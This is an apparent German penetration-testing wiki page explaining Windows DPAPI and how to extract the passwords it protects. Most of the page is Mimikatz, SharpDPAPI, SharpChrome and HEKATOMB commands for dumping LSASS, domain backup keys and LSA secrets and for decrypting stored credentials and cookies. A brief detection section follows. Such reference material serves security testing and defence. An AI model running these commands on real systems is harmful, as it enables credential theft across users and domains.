# DPAPI - Passwörter extrahieren

{{#include ../../banners/hacktricks-training.md}}



## Was ist DPAPI

Die Data Protection API (DPAPI) wird hauptsächlich im Windows-Betriebssystem für die **symmetrische Verschlüsselung asymmetrischer privater Schlüssel** verwendet, wobei entweder Benutzer- oder Systemgeheimnisse als bedeutende Entropiequelle dienen. Dieser Ansatz vereinfacht die Verschlüsselung für Entwickler, indem er ihnen ermöglicht, Daten mit einem Schlüssel zu verschlüsseln, der aus den Anmeldegeheimnissen des Benutzers oder, bei der Systemverschlüsselung, den Authentifizierungsgeheimnissen der Domäne des Systems abgeleitet wird, wodurch die Notwendigkeit entfällt, dass Entwickler den Schutz des Verschlüsselungsschlüssels selbst verwalten.

Die gebräuchlichste Methode zur Verwendung von DPAPI erfolgt über die **`CryptProtectData` und `CryptUnprotectData`** Funktionen, die es Anwendungen ermöglichen, Daten sicher mit der Sitzung des Prozesses zu verschlüsseln und zu entschlüsseln, der derzeit angemeldet ist. Das bedeutet, dass die verschlüsselten Daten nur von demselben Benutzer oder System entschlüsselt werden können, das sie verschlüsselt hat.

Darüber hinaus akzeptieren diese Funktionen auch einen **`entropy` Parameter**, der ebenfalls während der Verschlüsselung und Entschlüsselung verwendet wird. Daher müssen Sie, um etwas zu entschlüsseln, das mit diesem Parameter verschlüsselt wurde, den gleichen Entropiewert angeben, der während der Verschlüsselung verwendet wurde.

### Benutzer-Schlüsselgenerierung

Die DPAPI generiert einen einzigartigen Schlüssel (genannt **`pre-key`**) für jeden Benutzer basierend auf deren Anmeldeinformationen. Dieser Schlüssel wird aus dem Passwort des Benutzers und anderen Faktoren abgeleitet, und der Algorithmus hängt vom Typ des Benutzers ab, endet aber in der Regel als SHA1. Zum Beispiel hängt es für Domänenbenutzer von dem HTLM-Hash des Benutzers ab.

Dies ist besonders interessant, da ein Angreifer, wenn er den Passwort-Hash des Benutzers erlangen kann, in der Lage ist:

- **Alle Daten zu entschlüsseln, die mit DPAPI** mit dem Schlüssel dieses Benutzers verschlüsselt wurden, ohne eine API kontaktieren zu müssen
- Zu versuchen, das **Passwort offline zu knacken**, indem er versucht, den gültigen DPAPI-Schlüssel zu generieren

Darüber hinaus wird jedes Mal, wenn ein Benutzer Daten mit DPAPI verschlüsselt, ein neuer **Master-Schlüssel** generiert. Dieser Master-Schlüssel ist derjenige, der tatsächlich zur Verschlüsselung von Daten verwendet wird. Jeder Master-Schlüssel wird mit einer **GUID** (Globally Unique Identifier) versehen, die ihn identifiziert.

Die Master-Schlüssel werden im **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** Verzeichnis gespeichert, wobei `{SID}` der Sicherheitsbezeichner dieses Benutzers ist. Der Master-Schlüssel wird verschlüsselt mit dem **`pre-key`** des Benutzers und auch mit einem **Domänen-Backup-Schlüssel** für die Wiederherstellung gespeichert (d.h. derselbe Schlüssel wird zweimal mit 2 verschiedenen Passwörtern verschlüsselt gespeichert).

Beachten Sie, dass der **Domänenschlüssel, der zur Verschlüsselung des Master-Schlüssels verwendet wird, sich auf den Domänencontrollern befindet und sich niemals ändert**, sodass ein Angreifer, der Zugriff auf den Domänencontroller hat, den Domänen-Backup-Schlüssel abrufen und die Master-Schlüssel aller Benutzer in der Domäne entschlüsseln kann.

Die verschlüsselten Blobs enthalten die **GUID des Master-Schlüssels**, der zur Verschlüsselung der Daten in seinen Headern verwendet wurde.

> [!NOTE]
> DPAPI-verschlüsselte Blobs beginnen mit **`01 00 00 00`**

Master-Schlüssel finden:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Dies ist, wie eine Reihe von Master-Schlüsseln eines Benutzers aussehen wird:

![](<../../images/image (1121).png>)

### Maschinen-/Systemschlüsselgenerierung

Dies ist der Schlüssel, der von der Maschine verwendet wird, um Daten zu verschlüsseln. Er basiert auf dem **DPAPI_SYSTEM LSA-Geheimnis**, das ein spezieller Schlüssel ist, auf den nur der SYSTEM-Benutzer zugreifen kann. Dieser Schlüssel wird verwendet, um Daten zu verschlüsseln, die vom System selbst zugänglich sein müssen, wie z. B. maschinenbezogene Anmeldeinformationen oder systemweite Geheimnisse.

Beachten Sie, dass diese Schlüssel **kein Domänen-Backup haben**, sodass sie nur lokal zugänglich sind:

- **Mimikatz** kann darauf zugreifen, indem es LSA-Geheimnisse mit dem Befehl: `mimikatz lsadump::secrets` dumpet.
- Das Geheimnis wird in der Registrierung gespeichert, sodass ein Administrator **die DACL-Berechtigungen ändern könnte, um darauf zuzugreifen**. Der Registrierungspfad ist: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`


### Geschützte Daten durch DPAPI

Zu den persönlichen Daten, die durch DPAPI geschützt sind, gehören:

- Windows-Anmeldeinformationen
- Passwörter und Auto-Vervollständigungsdaten von Internet Explorer und Google Chrome
- E-Mail- und interne FTP-Konto-Passwörter für Anwendungen wie Outlook und Windows Mail
- Passwörter für freigegebene Ordner, Ressourcen, drahtlose Netzwerke und Windows Vault, einschließlich Verschlüsselungsschlüssel
- Passwörter für Remote-Desktop-Verbindungen, .NET Passport und private Schlüssel für verschiedene Verschlüsselungs- und Authentifizierungszwecke
- Netzwerkpasswörter, die vom Credential Manager verwaltet werden, und persönliche Daten in Anwendungen, die CryptProtectData verwenden, wie Skype, MSN Messenger und mehr
- Verschlüsselte Blobs in der Registrierung
- ...

Systemgeschützte Daten umfassen:
- Wifi-Passwörter
- Passwörter für geplante Aufgaben
- ...

### Optionen zur Extraktion des Master-Schlüssels

- Wenn der Benutzer über Domänen-Administratorrechte verfügt, kann er auf den **Domänen-Backup-Schlüssel** zugreifen, um alle Benutzer-Master-Schlüssel in der Domäne zu entschlüsseln:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Mit lokalen Administratorrechten ist es möglich, den **LSASS-Speicher** zuzugreifen, um die DPAPI-Master-Schlüssel aller verbundenen Benutzer und den SYSTEM-Schlüssel zu extrahieren.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Wenn der Benutzer lokale Administratorrechte hat, kann er auf das **DPAPI_SYSTEM LSA-Geheimnis** zugreifen, um die Maschinen-Master-Schlüssel zu entschlüsseln:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Wenn das Passwort oder der NTLM-Hash des Benutzers bekannt ist, kann man **die Master-Schlüssel des Benutzers direkt entschlüsseln**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Wenn Sie sich in einer Sitzung als der Benutzer befinden, ist es möglich, den DC nach dem **Backup-Schlüssel zur Entschlüsselung der Master-Schlüssel über RPC** zu fragen. Wenn Sie lokaler Administrator sind und der Benutzer angemeldet ist, könnten Sie **sein Sitzungstoken stehlen** dafür:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Liste Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Zugriff auf DPAPI-verschlüsselte Daten

### Finden Sie DPAPI-verschlüsselte Daten

Häufig geschützte **Dateien** von Benutzern befinden sich in:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Überprüfen Sie auch, ob Sie `\Roaming\` in den obigen Pfaden durch `\Local\` ersetzen. 

Beispiele zur Enumeration:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) kann DPAPI-verschlüsselte Blobs im Dateisystem, in der Registrierung und in B64-Blobs finden:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Beachten Sie, dass [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (aus demselben Repository) verwendet werden kann, um mit DPAPI sensible Daten wie Cookies zu entschlüsseln.

### Zugriffsschlüssel und Daten

- **Verwenden Sie SharpDPAPI**, um Anmeldeinformationen aus DPAPI-verschlüsselten Dateien der aktuellen Sitzung zu erhalten:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Holen Sie sich Anmeldeinformationen** wie die verschlüsselten Daten und den guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Zugriff auf Masterkeys**:

Entschlüsseln Sie einen Masterkey eines Benutzers, der den **Domain-Backup-Schlüssel** über RPC anfordert:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
Das **SharpDPAPI**-Tool unterstützt auch diese Argumente zur Entschlüsselung des Masterkeys (beachten Sie, dass es möglich ist, `/rpc` zu verwenden, um den Backup-Schlüssel der Domäne zu erhalten, `/password`, um ein Klartextpasswort zu verwenden, oder `/pvk`, um eine DPAPI-Domänen-Privatschlüsseldatei anzugeben...):
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Daten mit einem Masterkey entschlüsseln**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
Das **SharpDPAPI**-Tool unterstützt auch diese Argumente für die `credentials|vaults|rdg|keepass|triage|blob|ps`-Entschlüsselung (beachten Sie, wie es möglich ist, `/rpc` zu verwenden, um den Backup-Schlüssel der Domäne zu erhalten, `/password`, um ein Klartextpasswort zu verwenden, `/pvk`, um eine DPAPI-Domänen-Privatschlüsseldatei anzugeben, `/unprotect`, um die Sitzung des aktuellen Benutzers zu verwenden...):
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Entschlüsseln Sie einige Daten mit **der aktuellen Benutzersitzung**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
### Zugriff auf Daten anderer Maschinen

In **SharpDPAPI und SharpChrome** können Sie die **`/server:HOST`** Option angeben, um auf die Daten einer Remote-Maschine zuzugreifen. Natürlich müssen Sie in der Lage sein, auf diese Maschine zuzugreifen, und im folgenden Beispiel wird angenommen, dass der **Domain-Backup-Verschlüsselungsschlüssel bekannt ist**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Andere Werkzeuge

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) ist ein Tool, das die Extraktion aller Benutzer und Computer aus dem LDAP-Verzeichnis sowie die Extraktion des Backup-Schlüssels des Domänencontrollers über RPC automatisiert. Das Skript wird dann die IP-Adressen aller Computer auflösen und einen smbclient auf allen Computern ausführen, um alle DPAPI-Blobs aller Benutzer abzurufen und alles mit dem Domänen-Backup-Schlüssel zu entschlüsseln.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Mit der aus der LDAP-Computerliste extrahierten Liste können Sie jedes Subnetz finden, selbst wenn Sie es nicht kannten!

### DonPAPI

[**DonPAPI**](https://github.com/login-securite/DonPAPI) kann automatisch durch DPAPI geschützte Geheimnisse dumpen.

### Häufige Erkennungen

- Zugriff auf Dateien in `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` und anderen DPAPI-bezogenen Verzeichnissen.
- Besonders von einem Netzwerkfreigabe wie C$ oder ADMIN$.
- Verwendung von Mimikatz, um auf den LSASS-Speicher zuzugreifen.
- Ereignis **4662**: Eine Operation wurde an einem Objekt durchgeführt.
- Dieses Ereignis kann überprüft werden, um zu sehen, ob das `BCKUPKEY`-Objekt zugegriffen wurde.

## Referenzen

- [https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)

{{#include ../../banners/hacktricks-training.md}}
